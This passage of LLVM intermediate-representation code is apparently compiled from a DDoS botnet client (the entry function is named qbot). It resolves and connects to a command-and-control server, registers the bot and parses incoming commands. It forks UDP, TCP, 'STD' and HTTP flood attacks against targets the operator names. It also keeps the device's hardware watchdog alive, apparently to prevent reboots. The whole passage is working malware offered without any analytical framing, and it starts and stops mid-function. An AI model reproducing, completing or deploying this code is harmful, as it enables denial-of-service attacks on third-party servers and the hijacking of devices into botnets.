  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %17, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = tail call i32 @socket(i32 2, i32 1, i32 6) #8
  %21 = bitcast i32* %4 to i8*
  %22 = call i32 @setsockopt(i32 %20, i32 6, i32 1, i8* nonnull %21, i32 4) #8
  %23 = icmp eq i32 %20, -1
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %8
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.51, i64 0, i64 0)) #15
  call void @exit(i32 1) #14
  unreachable

; <label>:25:                                     ; preds = %8
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %27 = call i32 @connect(i32 %20, %struct.sockaddr* nonnull %26, i32 16) #8
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %25
  call void @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i64 0, i64 0)) #15
  call void @exit(i32 1) #14
  unreachable

; <label>:30:                                     ; preds = %25
  ret i32 %20
}

; Function Attrs: nounwind
declare void @herror(i8*) local_unnamed_addr #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #11

; Function Attrs: nounwind
declare void @perror(i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @httpflood(i8*, i8*, i16 zeroext, i8*, i32, i32) local_unnamed_addr #1 {
  %7 = alloca [512 x i8], align 16
  %8 = alloca [1 x i8], align 1
  %9 = tail call i64 @time(i64* null) #8
  %10 = icmp sgt i32 %5, 0
  br i1 %10, label %11, label %35

; <label>:11:                                     ; preds = %6
  %12 = zext i32 %4 to i64
  %13 = add i64 %9, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %15 = tail call i32 @rand() #8
  %16 = srem i32 %15, 39
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [39 x i8*], [39 x i8*]* @UserAgents, i64 0, i64 %17
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %14, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.53, i64 0, i64 0), i8* %0, i8* %3, i8* %1, i8* %19) #8
  %sext = shl i64 %13, 32
  %21 = ashr exact i64 %sext, 32
  %22 = tail call i64 @time(i64* null) #8
  %23 = icmp sgt i64 %21, %22
  br i1 %23, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %11
  %24 = getelementptr inbounds [1 x i8], [1 x i8]* %8, i64 0, i64 0
  br label %25

; <label>:25:                                     ; preds = %.lr.ph, %.backedge
  %26 = tail call i32 @socket_connect(i8* %1, i16 zeroext %2)
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %.backedge, label %28

; <label>:28:                                     ; preds = %25
  %29 = call i64 @strlen(i8* nonnull %14) #13
  %30 = call i64 @write(i32 %26, i8* nonnull %14, i64 %29) #8
  %31 = call i64 @read(i32 %26, i8* nonnull %24, i64 1) #8
  %32 = tail call i32 @close(i32 %26) #8
  br label %.backedge

.backedge:                                        ; preds = %28, %25
  %33 = tail call i64 @time(i64* null) #8
  %34 = icmp sgt i64 %21, %33
  br i1 %34, label %25, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %11
  tail call void @exit(i32 0) #14
  unreachable

; <label>:35:                                     ; preds = %6
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #4

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #7

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #7

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #8
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %23, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numattackpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numattackpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #8
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %11 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %12 = load i32*, i32** @attackpids, align 8
  %13 = getelementptr inbounds i32, i32* %12, i64 %11
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %11
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = load i64, i64* @numattackpids, align 8
  %19 = add i64 %18, -1
  %20 = icmp ult i64 %17, %19
  br i1 %20, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.lcssa = phi i64 [ 0, %3 ], [ %19, %._crit_edge.loopexit ]
  %21 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %21, align 4
  %22 = load i8*, i8** bitcast (i32** @attackpids to i8**), align 8
  tail call void @free(i8* %22) #8
  store i8* %8, i8** bitcast (i32** @attackpids to i8**), align 8
  br label %23

; <label>:23:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @stop_attack() local_unnamed_addr #1 {
  %1 = load i64, i64* @numattackpids, align 8
  %2 = icmp eq i64 %1, 0
  br i1 %2, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %15
  %.08 = phi i64 [ %16, %15 ], [ 0, %.lr.ph.preheader ]
  %3 = load i32*, i32** @attackpids, align 8
  %4 = getelementptr inbounds i32, i32* %3, i64 %.08
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %15, label %7

; <label>:7:                                      ; preds = %.lr.ph
  %8 = tail call i32 @getpid() #8
  %9 = icmp eq i32 %5, %8
  br i1 %9, label %15, label %10

; <label>:10:                                     ; preds = %7
  %11 = load i32*, i32** @attackpids, align 8
  %12 = getelementptr inbounds i32, i32* %11, i64 %.08
  %13 = load i32, i32* %12, align 4
  %14 = tail call i32 @kill(i32 %13, i32 9) #8
  br label %15

; <label>:15:                                     ; preds = %7, %.lr.ph, %10
  %16 = add i64 %.08, 1
  %17 = load i64, i64* @numattackpids, align 8
  %18 = icmp ult i64 %16, %17
  br i1 %18, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %15
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  ret void
}

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @registerme(i8*) local_unnamed_addr #1 {
  %2 = alloca [100 x i8], align 16
  %3 = getelementptr inbounds [100 x i8], [100 x i8]* %2, i64 0, i64 0
  %4 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* nonnull %3, i64 100, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.55, i64 0, i64 0), i8* %0) #8
  %5 = load i32, i32* @C2, align 4
  %6 = call i64 @strlen(i8* nonnull %3) #13
  %7 = call i64 @write(i32 %5, i8* nonnull %3, i64 %6) #8
  ret void
}

; Function Attrs: nounwind
declare i32 @snprintf(i8* nocapture, i64, i8* nocapture readonly, ...) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @resolve_http() local_unnamed_addr #1 {
  %1 = load i8*, i8** @c2_http_host, align 8
  %2 = tail call %struct.hostent* @gethostbyname(i8* %1) #8
  %3 = icmp eq %struct.hostent* %2, null
  br i1 %3, label %4, label %5

; <label>:4:                                      ; preds = %0
  tail call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.50, i64 0, i64 0)) #8
  br label %16

; <label>:5:                                      ; preds = %0
  %6 = getelementptr inbounds %struct.hostent, %struct.hostent* %2, i64 0, i32 4
  %7 = bitcast i8*** %6 to %struct.in_addr***
  %8 = load %struct.in_addr**, %struct.in_addr*** %7, align 8
  %9 = load %struct.in_addr*, %struct.in_addr** %8, align 8
  %10 = icmp eq %struct.in_addr* %9, null
  br i1 %10, label %16, label %11

; <label>:11:                                     ; preds = %5
  %12 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i64 0, i32 0
  %13 = load i32, i32* %12, align 4
  %14 = tail call i8* @inet_ntoa(i32 %13) #8
  %15 = tail call i8* @strcpy(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @c2_host, i64 0, i64 0), i8* %14) #8
  br label %16

; <label>:16:                                     ; preds = %5, %11, %4
  %.0 = phi i32 [ 1, %4 ], [ 0, %11 ], [ 1, %5 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @watchdog_maintain() local_unnamed_addr #1 {
  %1 = alloca i32, align 4
  store i32 1, i32* %1, align 4
  tail call void @table_unlock_val(i8 zeroext 1)
  tail call void @table_unlock_val(i8 zeroext 2)
  tail call void @table_unlock_val(i8 zeroext 3)
  tail call void @table_unlock_val(i8 zeroext 4)
  tail call void @table_unlock_val(i8 zeroext 5)
  tail call void @table_unlock_val(i8 zeroext 6)
  tail call void @table_unlock_val(i8 zeroext 7)
  %2 = tail call i8* @table_retrieve_val(i32 1, i32* null)
  %3 = tail call i32 (i8*, i32, ...) @open(i8* %2, i32 2) #8
  %4 = icmp eq i32 %3, -1
  br i1 %4, label %5, label %.thread

; <label>:5:                                      ; preds = %0
  %6 = tail call i8* @table_retrieve_val(i32 2, i32* null)
  %7 = tail call i32 (i8*, i32, ...) @open(i8* %6, i32 2) #8
  %8 = icmp eq i32 %7, -1
  br i1 %8, label %9, label %.thread

; <label>:9:                                      ; preds = %5
  %10 = tail call i8* @table_retrieve_val(i32 3, i32* null)
  %11 = tail call i32 (i8*, i32, ...) @open(i8* %10, i32 2) #8
  %12 = icmp eq i32 %11, -1
  br i1 %12, label %13, label %.thread

; <label>:13:                                     ; preds = %9
  %14 = tail call i8* @table_retrieve_val(i32 4, i32* null)
  %15 = tail call i32 (i8*, i32, ...) @open(i8* %14, i32 2) #8
  %16 = icmp eq i32 %15, -1
  br i1 %16, label %17, label %.thread

; <label>:17:                                     ; preds = %13
  %18 = tail call i8* @table_retrieve_val(i32 5, i32* null)
  %19 = tail call i32 (i8*, i32, ...) @open(i8* %18, i32 2) #8
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %.thread

; <label>:21:                                     ; preds = %17
  %22 = tail call i8* @table_retrieve_val(i32 6, i32* null)
  %23 = tail call i32 (i8*, i32, ...) @open(i8* %22, i32 2) #8
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %.thread

; <label>:25:                                     ; preds = %21
  %26 = tail call i8* @table_retrieve_val(i32 7, i32* null)
  %27 = tail call i32 (i8*, i32, ...) @open(i8* %26, i32 2) #8
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %45, label %.thread

.thread:                                          ; preds = %0, %5, %9, %13, %17, %21, %25
  %.sroa.19.0 = phi i32 [ 0, %0 ], [ 0, %5 ], [ 0, %9 ], [ 0, %13 ], [ 0, %17 ], [ 0, %21 ], [ %27, %25 ]
  %.sroa.16.0 = phi i32 [ 0, %0 ], [ 0, %5 ], [ 0, %9 ], [ 0, %13 ], [ 0, %17 ], [ %23, %21 ], [ -1, %25 ]
  %.sroa.13.0 = phi i32 [ 0, %0 ], [ 0, %5 ], [ 0, %9 ], [ 0, %13 ], [ %19, %17 ], [ -1, %21 ], [ -1, %25 ]
  %.sroa.10.0 = phi i32 [ 0, %0 ], [ 0, %5 ], [ 0, %9 ], [ %15, %13 ], [ -1, %17 ], [ -1, %21 ], [ -1, %25 ]
  %.sroa.7.0 = phi i32 [ 0, %0 ], [ 0, %5 ], [ %11, %9 ], [ -1, %13 ], [ -1, %17 ], [ -1, %21 ], [ -1, %25 ]
  %.sroa.4.0 = phi i32 [ 0, %0 ], [ %7, %5 ], [ -1, %9 ], [ -1, %13 ], [ -1, %17 ], [ -1, %21 ], [ -1, %25 ]
  %29 = call i32 (i32, i64, ...) @ioctl(i32 %3, i64 2147768068, i32* nonnull %1) #8
  %30 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.4.0, i64 2147768068, i32* nonnull %1) #8
  %31 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.7.0, i64 2147768068, i32* nonnull %1) #8
  %32 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.10.0, i64 2147768068, i32* nonnull %1) #8
  %33 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.13.0, i64 2147768068, i32* nonnull %1) #8
  %34 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.16.0, i64 2147768068, i32* nonnull %1) #8
  %35 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.19.0, i64 2147768068, i32* nonnull %1) #8
  br label %36

; <label>:36:                                     ; preds = %.thread, %36
  %37 = call i32 (i32, i64, ...) @ioctl(i32 %3, i64 2147768069, i32 0) #8
  %38 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.4.0, i64 2147768069, i32 0) #8
  %39 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.7.0, i64 2147768069, i32 0) #8
  %40 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.10.0, i64 2147768069, i32 0) #8
  %41 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.13.0, i64 2147768069, i32 0) #8
  %42 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.16.0, i64 2147768069, i32 0) #8
  %43 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.19.0, i64 2147768069, i32 0) #8
  %44 = call i32 @sleep(i32 3) #8
  br label %36

; <label>:45:                                     ; preds = %25
  tail call void @table_lock_val(i8 zeroext 1)
  tail call void @table_lock_val(i8 zeroext 2)
  tail call void @table_lock_val(i8 zeroext 3)
  tail call void @table_lock_val(i8 zeroext 4)
  tail call void @table_lock_val(i8 zeroext 5)
  tail call void @table_lock_val(i8 zeroext 6)
  tail call void @table_lock_val(i8 zeroext 7)
  ret void
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #7

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #4

declare i32 @sleep(i32) local_unnamed_addr #7

; Function Attrs: noinline nounwind uwtable
define void @proc_cmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i8* @strstr(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.56, i64 0, i64 0)) #13
  %5 = icmp eq i8* %4, null
  br i1 %5, label %6, label %15

; <label>:6:                                      ; preds = %2
  %7 = tail call i8* @strstr(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i64 0, i64 0)) #13
  %8 = icmp eq i8* %7, null
  br i1 %8, label %9, label %15

; <label>:9:                                      ; preds = %6
  %10 = tail call i8* @strstr(i8* %3, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.58, i64 0, i64 0)) #13
  %11 = icmp eq i8* %10, null
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %9
  %13 = tail call i8* @strstr(i8* %3, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.59, i64 0, i64 0)) #13
  %14 = icmp eq i8* %13, null
  br i1 %14, label %16, label %15

; <label>:15:                                     ; preds = %12, %9, %6, %2
  tail call void @stop_attack()
  br label %16

; <label>:16:                                     ; preds = %12, %15
  %17 = load i8*, i8** %1, align 8
  %18 = tail call i8* @strstr(i8* %17, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.60, i64 0, i64 0)) #13
  %19 = icmp eq i8* %18, null
  br i1 %19, label %20, label %23

; <label>:20:                                     ; preds = %16
  %21 = tail call i8* @strstr(i8* %17, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.61, i64 0, i64 0)) #13
  %22 = icmp eq i8* %21, null
  br i1 %22, label %40, label %23

; <label>:23:                                     ; preds = %20, %16
  %24 = icmp eq i32 %0, 5
  br i1 %24, label %25, label %118

; <label>:25:                                     ; preds = %23
  %26 = tail call i32 @listFork()
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %118

; <label>:28:                                     ; preds = %25
  %29 = getelementptr inbounds i8*, i8** %1, i64 1
  %30 = load i8*, i8** %29, align 8
  %31 = getelementptr inbounds i8*, i8** %1, i64 2
  %32 = load i8*, i8** %31, align 8
  %33 = tail call i32 @atoi(i8* %32) #13
  %34 = getelementptr inbounds i8*, i8** %1, i64 3
  %35 = load i8*, i8** %34, align 8
  %36 = tail call i32 @atoi(i8* %35) #13
  %37 = getelementptr inbounds i8*, i8** %1, i64 4
  %38 = load i8*, i8** %37, align 8
  %39 = tail call i32 @atoi(i8* %38) #13
  tail call void @udpflood(i8* %30, i32 %33, i32 %36, i32 %39)
  br label %40

; <label>:40:                                     ; preds = %20, %28
  %41 = load i8*, i8** %1, align 8
  %42 = tail call i8* @strstr(i8* %41, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.62, i64 0, i64 0)) #13
  %43 = icmp eq i8* %42, null
  br i1 %43, label %44, label %47

; <label>:44:                                     ; preds = %40
  %45 = tail call i8* @strstr(i8* %41, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i64 0, i64 0)) #13
  %46 = icmp eq i8* %45, null
  br i1 %46, label %66, label %47

; <label>:47:                                     ; preds = %44, %40
  %48 = icmp eq i32 %0, 6
  br i1 %48, label %49, label %118

; <label>:49:                                     ; preds = %47
  %50 = tail call i32 @listFork()
  %51 = icmp eq i32 %50, 0
  br i1 %51, label %52, label %118

; <label>:52:                                     ; preds = %49
  %53 = getelementptr inbounds i8*, i8** %1, i64 1
  %54 = load i8*, i8** %53, align 8
  %55 = getelementptr inbounds i8*, i8** %1, i64 2
  %56 = load i8*, i8** %55, align 8
  %57 = tail call i32 @atoi(i8* %56) #13
  %58 = getelementptr inbounds i8*, i8** %1, i64 3
  %59 = load i8*, i8** %58, align 8
  %60 = tail call i32 @atoi(i8* %59) #13
  %61 = getelementptr inbounds i8*, i8** %1, i64 4
  %62 = load i8*, i8** %61, align 8
  %63 = tail call i32 @atoi(i8* %62) #13
  %64 = getelementptr inbounds i8*, i8** %1, i64 5
  %65 = load i8*, i8** %64, align 8
  tail call void @tcpflood(i8* %54, i32 %57, i32 %60, i32 %63, i8* %65)
  br label %66

; <label>:66:                                     ; preds = %44, %52
  %67 = load i8*, i8** %1, align 8
  %68 = tail call i8* @strstr(i8* %67, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i64 0, i64 0)) #13
  %69 = icmp eq i8* %68, null
  br i1 %69, label %70, label %73

; <label>:70:                                     ; preds = %66
  %71 = tail call i8* @strstr(i8* %67, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i64 0, i64 0)) #13
  %72 = icmp eq i8* %71, null
  br i1 %72, label %90, label %73

; <label>:73:                                     ; preds = %70, %66
  %74 = icmp eq i32 %0, 5
  br i1 %74, label %75, label %118

; <label>:75:                                     ; preds = %73
  %76 = tail call i32 @listFork()
  %77 = icmp eq i32 %76, 0
  br i1 %77, label %78, label %118

; <label>:78:                                     ; preds = %75
  %79 = getelementptr inbounds i8*, i8** %1, i64 1
  %80 = load i8*, i8** %79, align 8
  %81 = getelementptr inbounds i8*, i8** %1, i64 2
  %82 = load i8*, i8** %81, align 8
  %83 = tail call i32 @atoi(i8* %82) #13
  %84 = getelementptr inbounds i8*, i8** %1, i64 3
  %85 = load i8*, i8** %84, align 8
  %86 = tail call i32 @atoi(i8* %85) #13
  %87 = getelementptr inbounds i8*, i8** %1, i64 4
  %88 = load i8*, i8** %87, align 8
  %89 = tail call i32 @atoi(i8* %88) #13
  tail call void @stdflood(i8* %80, i32 %83, i32 %86, i32 %89)
  unreachable

; <label>:90:                                     ; preds = %70
  %91 = tail call i8* @strstr(i8* %67, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.66, i64 0, i64 0)) #13
  %92 = icmp eq i8* %91, null
  br i1 %92, label %93, label %97

; <label>:93:                                     ; preds = %90
  %94 = tail call i8* @strstr(i8* %67, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i64 0, i64 0)) #13
  %95 = icmp ne i8* %94, null
  %96 = icmp eq i32 %0, 7
  %or.cond = and i1 %96, %95
  br i1 %or.cond, label %98, label %118

; <label>:97:                                     ; preds = %90
  %.old = icmp eq i32 %0, 7
  br i1 %.old, label %98, label %118

; <label>:98:                                     ; preds = %93, %97
  %99 = tail call i32 @listFork()
  %100 = icmp eq i32 %99, 0
  br i1 %100, label %101, label %118

; <label>:101:                                    ; preds = %98
  %102 = getelementptr inbounds i8*, i8** %1, i64 1
  %103 = load i8*, i8** %102, align 8
  %104 = getelementptr inbounds i8*, i8** %1, i64 2
  %105 = load i8*, i8** %104, align 8
  %106 = getelementptr inbounds i8*, i8** %1, i64 3
  %107 = load i8*, i8** %106, align 8
  %108 = tail call i32 @atoi(i8* %107) #13
  %109 = trunc i32 %108 to i16
  %110 = getelementptr inbounds i8*, i8** %1, i64 4
  %111 = load i8*, i8** %110, align 8
  %112 = getelementptr inbounds i8*, i8** %1, i64 5
  %113 = load i8*, i8** %112, align 8
  %114 = tail call i32 @atoi(i8* %113) #13
  %115 = getelementptr inbounds i8*, i8** %1, i64 6
  %116 = load i8*, i8** %115, align 8
  %117 = tail call i32 @atoi(i8* %116) #13
  tail call void @httpflood(i8* %103, i8* %105, i16 zeroext %109, i8* %111, i32 %114, i32 %117)
  br label %118

; <label>:118:                                    ; preds = %93, %25, %23, %49, %47, %75, %73, %98, %97, %101
  ret void
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #6

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define void @parse_buffer(i8*) local_unnamed_addr #1 {
  %2 = alloca [11 x i8*], align 16
  %3 = bitcast [11 x i8*]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 88, i32 16, i1 false)
  %4 = tail call i8* @strtok(i8* %0, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i64 0, i64 0)) #8
  %5 = icmp eq i8* %4, null
  br i1 %5, label %._crit_edge, label %.lr.ph17.preheader

.lr.ph17.preheader:                               ; preds = %1
  br label %.lr.ph17

.lr.ph17:                                         ; preds = %.lr.ph17.preheader, %.lr.ph17
  %indvars.iv19 = phi i64 [ %indvars.iv.next20, %.lr.ph17 ], [ 0, %.lr.ph17.preheader ]
  %6 = phi i8* [ %12, %.lr.ph17 ], [ %4, %.lr.ph17.preheader ]
  %7 = tail call i64 @strlen(i8* nonnull %6) #13
  %8 = add i64 %7, 1
  %9 = tail call noalias i8* @malloc(i64 %8) #8
  %indvars.iv.next20 = add nuw nsw i64 %indvars.iv19, 1
  %10 = getelementptr inbounds [11 x i8*], [11 x i8*]* %2, i64 0, i64 %indvars.iv19
  store i8* %9, i8** %10, align 8
  %11 = tail call i8* @strcpy(i8* %9, i8* nonnull %6) #8
  %12 = tail call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i64 0, i64 0)) #8
  %13 = icmp ne i8* %12, null
  %14 = icmp slt i64 %indvars.iv.next20, 10
  %15 = and i1 %14, %13
  br i1 %15, label %.lr.ph17, label %._crit_edge18

._crit_edge18:                                    ; preds = %.lr.ph17
  %16 = trunc i64 %indvars.iv.next20 to i32
  %17 = icmp sgt i32 %16, 0
  br i1 %17, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %._crit_edge18
  %18 = getelementptr inbounds [11 x i8*], [11 x i8*]* %2, i64 0, i64 0
  call void @proc_cmd(i32 %16, i8** nonnull %18)
  %wide.trip.count = and i64 %indvars.iv.next20, 4294967295
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph, %.lr.ph.preheader
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %.lr.ph ]
  %19 = getelementptr inbounds [11 x i8*], [11 x i8*]* %2, i64 0, i64 %indvars.iv
  %20 = load i8*, i8** %19, align 8
  call void @free(i8* %20) #8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1, %._crit_edge18
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @qbot() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #8
  %2 = icmp sgt i32 %1, 0
  br i1 %2, label %.loopexit, label %3

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @resolve_http()
  br label %5

; <label>:5:                                      ; preds = %33, %3
  %6 = load i32, i32* @C2, align 4
  %7 = tail call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0) #8
  %8 = or i32 %7, 2048
  %9 = tail call i32 (i32, i32, ...) @fcntl(i32 %6, i32 4, i32 %8) #8
  %10 = tail call i32 @socket(i32 2, i32 1, i32 0) #8
  store i32 %10, i32* @C2, align 4
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %5
  %13 = tail call i32 @close(i32 %10) #8
  %14 = tail call i32 @close(i32 0) #8
  br label %15

; <label>:15:                                     ; preds = %12, %5
  store i16 2, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i64 0, i32 0), align 4
  %16 = tail call i32 @inet_addr(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @c2_host, i64 0, i64 0)) #8
  store i32 %16, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i64 0, i32 2, i32 0), align 4
  %17 = load i32, i32* @c2_bot_port, align 4
  %18 = trunc i32 %17 to i16
  %19 = tail call zeroext i16 @htons(i16 zeroext %18) #12
  store i16 %19, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i64 0, i32 1), align 2
  %20 = load i32, i32* @C2, align 4
  %21 = tail call i32 @connect(i32 %20, %struct.sockaddr* bitcast (%struct.sockaddr_in* @Socket to %struct.sockaddr*), i32 16) #8
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %38

; <label>:23:                                     ; preds = %15
  %24 = load i32, i32* @retry, align 4
  %25 = icmp eq i32 %24, 3
  br i1 %25, label %26, label %30

; <label>:26:                                     ; preds = %23
  %27 = load i32, i32* @C2, align 4
  %28 = tail call i32 @close(i32 %27) #8
  %29 = tail call i32 @close(i32 0) #8
  br label %.loopexit

; <label>:30:                                     ; preds = %23
  %31 = load i32, i32* @tryagain, align 4
  %32 = icmp eq i32 %31, 1
  br i1 %32, label %33, label %.loopexit.loopexit

; <label>:33:                                     ; preds = %30
  %34 = load i32, i32* @C2, align 4
  %35 = tail call i32 @close(i32 %34) #8
  %36 = load i32, i32* @retry, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* @retry, align 4
  br label %5

; <label>:38:                                     ; preds = %15
  tail call void @registerme(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.69, i64 0, i64 0))
  %39 = load i32, i32* @C2, align 4
  %40 = tail call i64 @read(i32 %39, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0), i64 1024) #8
  %41 = trunc i64 %40 to i32
  store i32 %41, i32* @buffer, align 4
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %38
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %43 = phi i64 [ %60, %.backedge ], [ %40, %.lr.ph.preheader ]
  %sext = shl i64 %43, 32
  %44 = ashr exact i64 %sext, 32
  %45 = getelementptr inbounds [1024 x i8], [1024 x i8]* @buf, i64 0, i64 %44
  store i8 0, i8* %45, align 1
  %46 = tail call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.70, i64 0, i64 0)) #13
  %47 = icmp eq i8* %46, null
  br i1 %47, label %51, label %48

; <label>:48:                                     ; preds = %.lr.ph
  %49 = load i32, i32* @C2, align 4
